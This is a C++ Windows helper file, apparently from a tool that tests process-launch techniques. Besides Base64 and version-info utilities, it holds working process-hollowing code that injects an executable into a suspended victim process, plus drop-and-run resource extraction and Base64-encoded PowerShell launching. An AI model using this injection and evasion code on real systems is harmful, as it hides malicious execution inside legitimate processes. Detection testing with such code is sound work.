#include "helperFunctions.h"

std::int_fast32_t base64Decode(const std::string& callingEXEName, std::vector<BYTE>& encodedContent, std::vector<BYTE>& decodedContent)
{
	// Adapted from public domain examples available at 
	// https://en.wikibooks.org/wiki/Algorithm_Implementation/Miscellaneous/Base64

	// Character to pad encoded content to required length
	const char padCharacter = '=';

	// Confirm encodedContent length is valid for Base64.
	if (encodedContent.size() % 4)
	{
		return EXIT_FAILURE;
	}

	size_t padding = 0;
	if (encodedContent.size())
	{
		if (encodedContent[encodedContent.size() - 1] == padCharacter)
			padding++;
		if (encodedContent[encodedContent.size() - 2] == padCharacter)
			padding++;
	}

	int temp = 0; //Holds decoded quanta.
	std::vector<BYTE>::const_iterator cursor = encodedContent.begin();
	decodedContent.clear(); // Ensure output variable is empty before use.

	while (cursor < encodedContent.end())
	{
		for (size_t quantumPosition = 0; quantumPosition < 4; quantumPosition++)
		{
			temp <<= 6;
			if (*cursor >= 0x41 && *cursor <= 0x5A)
				temp |= *cursor - 0x41;
			else if (*cursor >= 0x61 && *cursor <= 0x7A)
				temp |= *cursor - 0x47;
			else if (*cursor >= 0x30 && *cursor <= 0x39)
				temp |= *cursor + 0x04;
			else if (*cursor == 0x2B)
				temp |= 0x3E;
			else if (*cursor == 0x2F)
				temp |= 0x3F;
			else if (*cursor == padCharacter) //pad
			{
				switch (encodedContent.end() - cursor)
				{
				case 1:
					// One padding character.
					decodedContent.push_back((temp >> 16) & 0x000000FF);
					decodedContent.push_back((temp >> 8) & 0x000000FF);
					return EXIT_SUCCESS;
				case 2:
					// Two padding characters.
					decodedContent.push_back((temp >> 10) & 0x000000FF);
					return EXIT_SUCCESS;
				default:
					std::cerr << callingEXEName << ": Failed to decode due to incorrect number of padding characters." << std::endl;
					return EXIT_FAILURE;
				}
			}
			else
			{
				std::cerr << callingEXEName << ": Failed to decode due to an invalid character found." << std::endl;
				return EXIT_FAILURE;
			}
			cursor++;
		}
		decodedContent.push_back((temp >> 16) & 0x000000FF);
		decodedContent.push_back((temp >> 8) & 0x000000FF);
		decodedContent.push_back((temp) & 0x000000FF);
	}

	return EXIT_SUCCESS;
}

std::int_fast32_t base64Encode(std::vector<BYTE>& decodedContent, std::vector<BYTE>& encodedContent)
{
	// Adapted from public domain examples available at 
	// https://en.wikibooks.org/wiki/Algorithm_Implementation/Miscellaneous/Base64

	// Character lookup for encoding
	const char encodeLookup[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	// Character to pad encoded content to required length
	const char padCharacter = '=';

	int temp; // Holds the encoded quanta.
	std::vector<BYTE>::iterator cursor = decodedContent.begin();
	encodedContent.clear(); // Ensure output variable is empty before use.

	for (size_t idx = 0; idx < decodedContent.size() / 3; idx++)
	{
		temp = (*cursor++) << 16; //Convert to big-endian
		temp += (*cursor++) << 8;
		temp += (*cursor++);
		encodedContent.push_back(encodeLookup[(temp & 0x00FC0000) >> 18]);
		encodedContent.push_back(encodeLookup[(temp & 0x0003F000) >> 12]);
		encodedContent.push_back(encodeLookup[(temp & 0x00000FC0) >> 6]);
		encodedContent.push_back(encodeLookup[(temp & 0x0000003F)]);
	}

	switch (decodedContent.size() % 3)
	{
	case 1:
		temp = (*cursor++) << 16; //Convert to big-endian
		encodedContent.push_back(encodeLookup[(temp & 0x00FC0000) >> 18]);
		encodedContent.push_back(encodeLookup[(temp & 0x0003F000) >> 12]);
		encodedContent.push_back(padCharacter);
		encodedContent.push_back(padCharacter);
		break;
	case 2:
		temp = (*cursor++) << 16; //Convert to big-endian
		temp += (*cursor++) << 8;
		encodedContent.push_back(encodeLookup[(temp & 0x00FC0000) >> 18]);
		encodedContent.push_back(encodeLookup[(temp & 0x0003F000) >> 12]);
		encodedContent.push_back(encodeLookup[(temp & 0x00000FC0) >> 6]);
		encodedContent.push_back(padCharacter);
		break;
	}

	return EXIT_SUCCESS;
}

std::int_fast32_t displayFileInfo()
{
	// Extracts and displays VS_VERSION_INFO resource.

	// Variable for the full path of the executable.
	char szFilename[MAX_PATH + 1] = { 0 };

	// Variables used to allocate a block of memory that will hold the version info.
	DWORD dummy = 0;
	DWORD dwSize = 0;

	// Variables to get the VS_VERSION_INFO resource
	LPVOID pvProductName = NULL, pvFileDescription = NULL, pvProductVersion = NULL,
		pvProductDescription = NULL, pvInternalName = NULL, pvCompanyName = NULL,
		pvLegalCopyright = NULL;
	UINT iProductNameLen = 0, iFileDescriptionLen = 0, iProductVersionLen = 0,
		iProductDescriptionLen = 0, iInternalNameLen = 0, iCompanyNameLen = 0,
		iLegalCopyrightLen = 0;
	std::string fileDescription; // Content is extracted to this string that is then split with \n to make readable.
	std::size_t fileDescriptionHeaderLength = strlen("File Description: ");
	std::string legalCopyright; // Content is extracted to this string that is then split with \n to make readable.
	std::size_t legalCopyrightHeaderLength = strlen("Legal Copyright: ");
	std::size_t maxSegmentLength = 80; // Max length of each line of fileDescription output.

	// Get the filename of the executable containing the VS_VERSION_INFO resource.
	if (GetModuleFileName(NULL, szFilename, MAX_PATH) == 0)
	{
		errorHandler("GetModuleFileName()");
		return EXIT_FAILURE;
	}

	// Get the size of the VS_VERSION_INFO block.	
	dwSize = GetFileVersionInfoSize(szFilename, &dummy);
	if (dwSize == 0)
	{
		errorHandler("GetFileVersionInfoSize()");
		return EXIT_FAILURE;
	}

	// Allocate the memory.
	std::vector<BYTE> data(dwSize);

	// Retrieve the VS_VERSION_INFO content.
	if (!GetFileVersionInfo(szFilename, NULL, dwSize, &data[0]))
	{
		errorHandler("GetFileVersionInfo()");
		return EXIT_FAILURE;
	}

	// "040904e4" is the language ID shown in the VS_VERSION_INFO "BlockHeader" field. 
	std::cout << "Product Name: " << ((VerQueryValue(&data[0], std::string("\\StringFileInfo\\040904b0\\ProductName").c_str(), &pvProductName, &iProductNameLen)) ? (LPCSTR)pvProductName : "~NONE~") << std::endl;
	fileDescription = ((VerQueryValue(&data[0], std::string("\\StringFileInfo\\040904b0\\FileDescription").c_str(), &pvFileDescription, &iFileDescriptionLen)) ? (LPCSTR)pvFileDescription : "~NONE~");
	std::cout << "File Description: " << splitStringIntoSegments(fileDescription, maxSegmentLength, fileDescriptionHeaderLength) << std::endl;
	std::cout << "Product Version: " << ((VerQueryValue(&data[0], std::string("\\StringFileInfo\\040904b0\\ProductVersion").c_str(), &pvProductVersion, &iProductVersionLen)) ? (LPCSTR)pvProductVersion : "~NONE~") << std::endl;
	std::cout << "Internal Name: " << ((VerQueryValue(&data[0], std::string("\\StringFileInfo\\040904b0\\InternalName").c_str(), &pvInternalName, &iInternalNameLen)) ? (LPCSTR)pvInternalName : "~NONE~") << std::endl;
	std::cout << "Company Name: " << ((VerQueryValue(&data[0], std::string("\\StringFileInfo\\040904b0\\CompanyName").c_str(), &pvCompanyName, &iCompanyNameLen)) ? (LPCSTR)pvCompanyName : "~NONE~") << std::endl;
	legalCopyright = ((VerQueryValue(&data[0], std::string("\\StringFileInfo\\040904b0\\LegalCopyright").c_str(), &pvLegalCopyright, &iLegalCopyrightLen)) ? (LPCSTR)pvLegalCopyright : "~NONE~");
	std::cout << "Legal Copyright: " << splitStringIntoSegments(legalCopyright, maxSegmentLength, legalCopyrightHeaderLength) << std::endl;
	std::cout << std::endl;

	return EXIT_SUCCESS;
}

std::int_fast32_t errorHandler(const std::string& operationName)
{
	// Retrieves the description of the last error and then displays 
	// a hex representation of the error code and the description.

	DWORD errorMessageID = ::GetLastError();
	std::stringstream sstream;
	sstream << std::hex << errorMessageID;
	LPSTR messageBuffer = nullptr;
	DWORD messageBufferSize = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
	std::string errorMessage(messageBuffer, messageBufferSize);
	LocalFree(messageBuffer);
	std::cerr << operationName << " error; "
		<< "Error Code: 0x" << sstream.str()
		<< "; Error Message: " << errorMessage << std::endl;

	return EXIT_SUCCESS;
}

std::int_fast32_t extractFileResource(const std::string& callingEXEName, const int& resourceIdentifier, const std::string& resourceType, const std::string& fileName, const bool& isBase64Encoded)
{
	// Retrieve Base64-encoded file.
	std::cout << callingEXEName << ": Retrieving " << fileName << " from resources." << std::endl;

	// Variables to extract and hold the content.
	HMODULE moduleHandle;
	HRSRC resourceHandle;
	HGLOBAL dataHandle;
	DWORD resourceSize;
	const char* firstByte;
	std::vector<unsigned char> output;
	std::vector<BYTE> extractedResourceFile;
	std::vector<BYTE> decodedResourceFile;

	moduleHandle = GetModuleHandle(NULL);
	resourceHandle = FindResource(moduleHandle, MAKEINTRESOURCE(resourceIdentifier), (LPCSTR)resourceType.c_str());
	if (resourceHandle == nullptr)
	{
		std::cerr << callingEXEName << ": Unable to obtain resourceHandle." << std::endl;
		return EXIT_FAILURE;
	}
	else
	{
		dataHandle = LoadResource(nullptr, resourceHandle);
		if (dataHandle == nullptr)
		{
			std::cerr << callingEXEName << ": Unable to obtain dataHandle." << std::endl;
			return EXIT_FAILURE;
		}
		else
		{
			resourceSize = SizeofResource(nullptr, resourceHandle);
			if (resourceSize == 0)
			{
				std::cerr << callingEXEName << ": Unable to obtain resourceSize." << std::endl;
				return EXIT_FAILURE;
			}
			else
			{
				firstByte = reinterpret_cast<const char*>(LockResource(dataHandle));
				if (firstByte == nullptr)
				{
					std::cerr << callingEXEName << ": Unable to obtain firstByte." << std::endl;
					return EXIT_FAILURE;
				}
				else
				{
					extractedResourceFile.resize(resourceSize);
					std::copy(firstByte, firstByte + resourceSize, extractedResourceFile.begin());
				}
			}
		}
	}
	
	// Decode the resource if necessary.
	if (isBase64Encoded)
	{
		std::cout << callingEXEName << ": Decoding " << fileName << "." << std::endl;
		if (base64Decode(callingEXEName, extractedResourceFile, decodedResourceFile) == EXIT_FAILURE)
		{
			std::cerr << callingEXEName << ": Failed to decode " << fileName << "." << std::endl;
			return EXIT_FAILURE;
		}
	}

	// Save the resource to the named file. 
	std::ofstream outputFile;
	std::cout << callingEXEName << ": Saving decoded " << fileName << " to file." << std::endl;
	outputFile.open(fileName, std::ios::out | std::ios::binary | std::ios::trunc);
	if (!outputFile.is_open())
	{
		std::cerr << callingEXEName << ": Failed to create " << fileName << " file. " << std::endl;
		return EXIT_FAILURE;
	}

	// Save either the decoded or original resource as appropriate.
	if (isBase64Encoded)
	{
		outputFile.write((const char*)&decodedResourceFile[0], decodedResourceFile.size());
	}
	else
	{ 
		outputFile.write((const char*)&extractedResourceFile[0], extractedResourceFile.size());
	}
	
	if (outputFile.bad())
	{
		std::cerr << callingEXEName << ": Failed to write " << fileName << " to file." << std::endl;
		return EXIT_FAILURE;
	}
	else
	{
		outputFile.close();
	}

	return EXIT_SUCCESS;
}

void launchCreateProcess(const std::string& callingEXEName, const std::string& launchEXEName, const std::string& launchEXEArguments)
{
	std::cout << callingEXEName << ": CreateProcess is launching " << launchEXEName << "." << std::endl;

	STARTUPINFO StartupInfo;
	StartupInfo.cb = sizeof StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	std::string arguments = launchEXEName + " " + launchEXEArguments + " " + "(CreateProcess)";
	if (CreateProcess(launchEXEName.c_str(),  // Executable
		(LPSTR)arguments.c_str(),             // Executable and arguments
		NULL,                                 // Process handle not inheritable
		NULL,                                 // Thread handle not inheritable
		FALSE,                                // Set handle inheritance to FALSE
		CREATE_NEW_CONSOLE,                   // Create a new console window
		NULL,                                 // Use parent's environment block
		NULL,                                 // Use parent's starting directory 
		&StartupInfo,                         // Pointer to STARTUPINFO structure
		&ProcessInfo)                         // Pointer to PROCESS_INFORMATION structure
		)
	{
		WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
		CloseHandle(ProcessInfo.hThread);
		CloseHandle(ProcessInfo.hProcess);
	}
	else
	{
		std::cerr << callingEXEName << ": CreateProcess failed to launch " << launchEXEName << "." << std::endl;
	}

	std::cout << callingEXEName << ": CreateProcess launching of " << launchEXEName << " has completed." << std::endl;
	return;
}

void launchHollowing(const std::string& callingEXEName, const std::string& launchEXEName, const std::string& launchEXEArguments, const std::string& victimEXEName)
{
	std::cout << callingEXEName << ": Hollowing is launching " << launchEXEName << " in hollowed " << victimEXEName << "." << std::endl;

	PIMAGE_DOS_HEADER pDOSHeader;
	PIMAGE_NT_HEADERS pNTHeaders;
	PIMAGE_SECTION_HEADER pSectionHeader;
	PVOID victimEXEMemory, launchEXEBaseAddress;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	CONTEXT cpuContext;

	cpuContext.ContextFlags = CONTEXT_FULL;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	// Load the launchEXEName executable into memory in advance of injection.
	std::ifstream inputFile(launchEXEName, std::ios::binary | std::ios::ate);
	if (!inputFile.is_open())
	{
		std::cerr << callingEXEName << ": Hollowing failed to open " << launchEXEName << " file. " << std::endl;
		return;
	}
	std::ifstream::pos_type inputFileSize = inputFile.tellg();
	std::vector<BYTE> launchEXEImage(inputFileSize);
	inputFile.seekg(0, std::ios::beg);
	inputFile.read((char*)launchEXEImage.data(), inputFileSize);
	inputFile.close();

	// Start the victim application.
	std::string hollowedEXECommandLine = victimEXEName + " " + launchEXEArguments + " " + "(Hollowing " + victimEXEName + ")"; // Executable and arguments.
	std::cout << callingEXEName << ": Hollowing is starting " << victimEXEName << "." << std::endl;
	if (!CreateProcess(NULL,         // Application name
		&hollowedEXECommandLine[0],  // Command line
		NULL,                        // Process Attributes - Process handle not inheritable
		NULL,                        // Thread Attributes - Thread handle not inheritable
		FALSE,                       // No Handle Inheritance
		CREATE_SUSPENDED,            // Creation Flags - Start in suspended state
		NULL,                        // Use parent's Environment Block
		NULL,                        // Use parent's Current Directory
		&StartupInfo,                // Pointer to STARTUPINFO structure
		&ProcessInfo)                // Pointer to PROCESS_INFORMATION structure
		)
	{
		std::cerr << callingEXEName << ": Hollowing was unable to start " << victimEXEName << ". CreateProcess failed with error: " << GetLastError() << "." << std::endl;
		return;
	}
	else
	{
		std::cout << callingEXEName << ": Hollowing started " << victimEXEName << " in a suspended state." << std::endl;
	}

	pDOSHeader = (PIMAGE_DOS_HEADER)&launchEXEImage[0];

	if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		std::cerr << callingEXEName << ": Hollowing determined that " << victimEXEName << " has an invalid executable format." << std::endl;
		NtTerminateProcess(ProcessInfo.hProcess, 1); // Clean up by terminating the victim application.
		return;
	}

	pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)&launchEXEImage[0] + pDOSHeader->e_lfanew); // Get the address of the IMAGE_NT_HEADERS.
	NtGetContextThread(ProcessInfo.hThread, &cpuContext); // Get the thread cpuContext of the victim application's primary thread.
	// Get the PEB address from the rdx register and read the base address of launchEXEImage from the process environment block.
	NtReadVirtualMemory(ProcessInfo.hProcess, (PVOID)(cpuContext.Rdx + (sizeof(SIZE_T) * 2)), &launchEXEBaseAddress, sizeof(PVOID), NULL); 
	if ((SIZE_T)launchEXEBaseAddress == pNTHeaders->OptionalHeader.ImageBase) // Does the victim application image have same base address as the launchEXEImage?
	{
		std::cout << callingEXEName << ": Hollowing is unmapping original executable image from " << victimEXEName << " at address: " << (SIZE_T)launchEXEBaseAddress << std::endl;
		NtUnmapViewOfSection(ProcessInfo.hProcess, launchEXEBaseAddress); // Unmap the executable image using NtUnmapViewOfSection function.
	}

	std::cout << callingEXEName << ": Hollowing is allocating space in the memory of " << victimEXEName << "." << std::endl;
	victimEXEMemory = VirtualAllocEx(ProcessInfo.hProcess, (PVOID)pNTHeaders->OptionalHeader.ImageBase, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory for launchEXEImage.
	if (!victimEXEMemory)
	{
		std::cerr << callingEXEName << ": Hollowing is unable to allocate space in memory of " << victimEXEName << ". VirtualAllocEx failed with error " << GetLastError() << "." << std::endl;
		NtTerminateProcess(ProcessInfo.hProcess, 1); // Failed to allocate memory; terminate the victim application.
		return;
	}

	std::cout << callingEXEName << ": Hollowing allocated " << (SIZE_T)victimEXEMemory << " bytes in the memory of " << victimEXEName << "." << std::endl;
	std::cout << callingEXEName << ": Hollowing is writing the header of " << launchEXEName << " into the memory of " << victimEXEName <<  "." << std::endl;
	NtWriteVirtualMemory(ProcessInfo.hProcess, victimEXEMemory, &launchEXEImage[0], pNTHeaders->OptionalHeader.SizeOfHeaders, NULL); 
	std::cout << callingEXEName << ": Hollowing is writing the remainder of " << launchEXEName << " into the memory of " << victimEXEName << "." << std::endl;\
	for (DWORD section = 0; section < pNTHeaders->FileHeader.NumberOfSections; section++)
	{
		pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)&launchEXEImage[0] + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (section * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(ProcessInfo.hProcess, (PVOID)((LPBYTE)victimEXEMemory + pSectionHeader->VirtualAddress), (PVOID)((LPBYTE)&launchEXEImage[0] + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
	}

	std::cout << callingEXEName << ": Hollowing is setting the CPU's rcx register to the entry point of " << launchEXEName << "." << std::endl;
	cpuContext.Rcx = (SIZE_T)((LPBYTE)victimEXEMemory + pNTHeaders->OptionalHeader.AddressOfEntryPoint); 
	std::cout << callingEXEName << ": Hollowing set the entry point of " << launchEXEName << " to " << cpuContext.Rcx << "." << std::endl;
	std::cout << callingEXEName << ": Hollowing is writing the base address of " << launchEXEName << " into the process environment block." << std::endl;
	NtWriteVirtualMemory(ProcessInfo.hProcess, (PVOID)(cpuContext.Rdx + (sizeof(SIZE_T) * 2)), &pNTHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL); 
	std::cout << callingEXEName << ": Hollowing is setting the context of the primary thread of " << launchEXEName << "." << std::endl;
	NtSetContextThread(ProcessInfo.hThread, &cpuContext); 
	std::cout << callingEXEName << ": Hollowing is resuming the primary thread of " << victimEXEName << "." << std::endl;
	NtResumeThread(ProcessInfo.hThread, NULL);
	std::cout << callingEXEName << ": Hollowing has resumed the primary thread of " << victimEXEName << "." << std::endl;
	std::cout << callingEXEName << ": Hollowing is waiting for " << victimEXEName << " to terminate." << std::endl;
	NtWaitForSingleObject(ProcessInfo.hProcess, FALSE, NULL);
	std::cout << callingEXEName << ": Hollowing has determined that " << victimEXEName << " has terminated." << std::endl;	
	NtClose(ProcessInfo.hThread);
	NtClose(ProcessInfo.hProcess);

	std::cout << callingEXEName << ": Hollowing: Launching of " << launchEXEName << " in hollowed " << victimEXEName << " has completed." << std::endl;
	return;
}

void launchPowerShellEncodedCommand(const std::string& callingEXEName, const std::string& launchEXEName, const std::string& launchEXEArguments)
{
	std::cout << callingEXEName << ": PowerShell EncodedCommand is launching " << launchEXEName << "." << std::endl;

	// Build the command string and conert to UTF-16 (PowerShell uses UTF-16LE for the EncodeCommand).
	std::string utf8Command = "Start-Process -FilePath " + launchEXEName + " -ArgumentList \"" + launchEXEArguments + "(PowerShell EncodedCommand)\""; // Executable and arguments
	std::wstring utf16Command;
	if (utf8_to_utf16(utf8Command, utf16Command) == EXIT_FAILURE)
	{
		std::cerr << callingEXEName << ": PowerShell EncodedCommand failed to convert command to UTF-16." << std::endl;
		return;
	}

	// Base64-encode the command string. 
	size_t size_utf16Command = utf16Command.size() * sizeof(utf16Command[0]);
	BYTE* ptr_utf16Command = reinterpret_cast<BYTE*>(utf16Command.data());
	std::vector<BYTE> vecDecodedutf16Command(ptr_utf16Command, ptr_utf16Command + size_utf16Command);
	std::vector<BYTE> vecEncodedutf16Command;
	if (base64Encode(vecDecodedutf16Command, vecEncodedutf16Command) == EXIT_FAILURE)
	{
		std::cerr << callingEXEName << ": PowerShell EncodedCommand failed to encode command." << std::endl;
		return;
	}

	// Build the entire argument string.
	std::string arguments = "powershell -EncodedCommand "; // Prepend with the unencoded executable name and option.
	for (byte b64Character : vecEncodedutf16Command)
	{
		arguments += b64Character;
	}
	
	// Launch PowerShell with the encoded command.
	if (std::system(&arguments[0]) == -1)
	{
		std::cerr << callingEXEName << ": PowerShell EncodedCommand failed to launch " << launchEXEName << "." << std::endl;
	}

	std::cout << callingEXEName << ": PowerShell EncodedCommand launching of " << launchEXEName << " has completed." << std::endl;
	return;
}

void launchPowerShellStartProcess(const std::string& callingEXEName, const std::string& launchEXEName, const std::string& launchEXEArguments)
{
	std::cout << callingEXEName << ": PowerShell Start-Process is launching " << launchEXEName << "." << std::endl;

	std::string arguments = "powershell Start-Process -FilePath " + launchEXEName + " -ArgumentList \"'" + launchEXEArguments + "(PowerShell Start-Process)'\""; // Executable and arguments
	if (std::system(arguments.c_str()) == -1)
	{
		std::cerr << callingEXEName << ": PowerShell Start-Process failed to launch " << launchEXEName << "." << std::endl;
	}

	std::cout << callingEXEName << ": PowerShell Start-Process launching of " << launchEXEName << " has completed." << std::endl;
	return;
}

void launchShellExecute(const std::string& callingEXEName, const std::string& launchEXEName, const std::string& launchEXEArguments)
{
	std::cout << callingEXEName << ": ShellExecute is launching " << launchEXEName << "." << std::endl;

	std::string arguments = launchEXEArguments + " " + "(ShellExecute)"; // Arguments only
	if (!(ShellExecute(NULL, NULL, launchEXEName.c_str(), arguments.c_str(), NULL, SW_SHOWNORMAL) > (HINSTANCE)32))
	{
		std::cerr << callingEXEName << ": ShellExecute: failed to launch " << launchEXEName << "." << std::endl;
	}

	std::cout << callingEXEName << ": ShellExecute launching of " << launchEXEName << " has completed." << std::endl;
	return;
}

void launchShellExecuteExA(const std::string& callingEXEName, const std::string& launchEXEName, const std::string& launchEXEArguments)
{
	std::cout << callingEXEName << ": ShellExecuteExA is launching " << launchEXEName << "." << std::endl;

	std::string arguments = launchEXEArguments + " " + "(ShellExecuteExA)";
	SHELLEXECUTEINFO shellExecuteInfo;
	ZeroMemory(&shellExecuteInfo, sizeof(shellExecuteInfo));
	shellExecuteInfo.cbSize = sizeof(shellExecuteInfo);
	shellExecuteInfo.fMask = 0;
	shellExecuteInfo.hwnd = 0;
	shellExecuteInfo.lpVerb = NULL;
	shellExecuteInfo.lpFile = launchEXEName.c_str();          // Executable only
	shellExecuteInfo.lpParameters = arguments.c_str();  // Arguments only
	shellExecuteInfo.lpDirectory = 0;
	shellExecuteInfo.nShow = SW_SHOW;
	shellExecuteInfo.hInstApp = 0;
	if (!ShellExecuteEx(&shellExecuteInfo))
	{
		std::cerr << callingEXEName << ": ShellExecuteExA failed to launch " << launchEXEName << "." << std::endl;
	}

	std::cout << callingEXEName << ": ShellExecuteExA launching of " << launchEXEName << " has completed." << std::endl;
	return;
}

void launchStdSystem(const std::string& callingEXEName, const std::string& launchEXEName, const std::string& launchEXEArguments)
{
	std::cout << callingEXEName << ": std::system is launching " << launchEXEName << "." << std::endl;

	std::string arguments = launchEXEName + " " + launchEXEArguments + " " + "(std::system)"; // Executable and arguments
	if (std::system(arguments.c_str()) == -1)
	{
		std::cerr << callingEXEName << ": std::system failed to launch " << launchEXEName << "." << std::endl;
	}
	
	std::cout << callingEXEName << ": std::system launching of " << launchEXEName << " has completed." << std::endl;
	return;
}

std::string splitStringIntoSegments(const std::string& stringToSplit, const std::size_t& maxSegmentLength, const size_t& headerLength)
{
	std::string splitString;
	std::size_t currentSegmentLength = headerLength;
	std::istringstream ssStringToSplit(stringToSplit);
	std::vector<std::string> tokenizedStringToSplit((std::istream_iterator<std::string>(ssStringToSplit)), std::istream_iterator<std::string>());
	for (std::string token : tokenizedStringToSplit)
	{
		if ((currentSegmentLength + token.length() + 1) > maxSegmentLength) // Next token and a space.
		{
			splitString += "\n";
			currentSegmentLength = token.length() + 1; // Length after the token and space are added below.
		}
		else
		{
			currentSegmentLength += token.length() + 1; // Length after the token and space are added below.
		}
		splitString += token + " ";
	}
	return splitString;
}

std::int_fast32_t utf8_to_utf16(const std::string& utf8, std::wstring& utf16)
{
	if (utf8.empty()) {return EXIT_SUCCESS;} // Not really a failure if there is nothing to convert.

	// Fails if an invalid UTF-8 character is encountered.
	constexpr DWORD kFlags = MB_ERR_INVALID_CHARS;

	if (utf8.length() > static_cast<size_t>((std::numeric_limits<int>::max)()))
	{
		std::cerr << "utf8_to_utf16 failed: Input string too long." << std::endl;
		return EXIT_FAILURE;
	}

	const int utf8Length = static_cast<int>(utf8.length());

	// Get the size required for the UTF-16 string.
	const int utf16Length = ::MultiByteToWideChar(
		CP_UTF8,       // Source string is in UTF-8
		kFlags,        // Conversion flags
		utf8.data(),   // Source UTF-8 string pointer
		utf8Length,    // Length of the source UTF-8 string, in chars
		nullptr,       // Unused - no conversion done in this step
		0              // Request size of destination buffer, in wchar_ts
	);

	if (utf16Length == 0)
	{
		std::cerr << "utf8_to_utf16 failed: utf16Length==0." << std::endl;
		return EXIT_FAILURE;
	}

	utf16.resize(utf16Length); // Change it to the required size.

	// Convert from UTF-8 to UTF-16
	int result = ::MultiByteToWideChar(
		CP_UTF8,       // Source string is in UTF-8
		kFlags,        // Conversion flags
		utf8.data(),   // Source UTF-8 string pointer
		utf8Length,    // Length of source UTF-8 string, in chars
		&utf16[0],     // Pointer to destination buffer
		utf16Length    // Size of destination buffer, in wchar_ts          
	);

	if (result == 0)
	{
		std::cerr << "utf8_to_utf16 failed: MultiByteToWideChar result==0." << std::endl;
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}
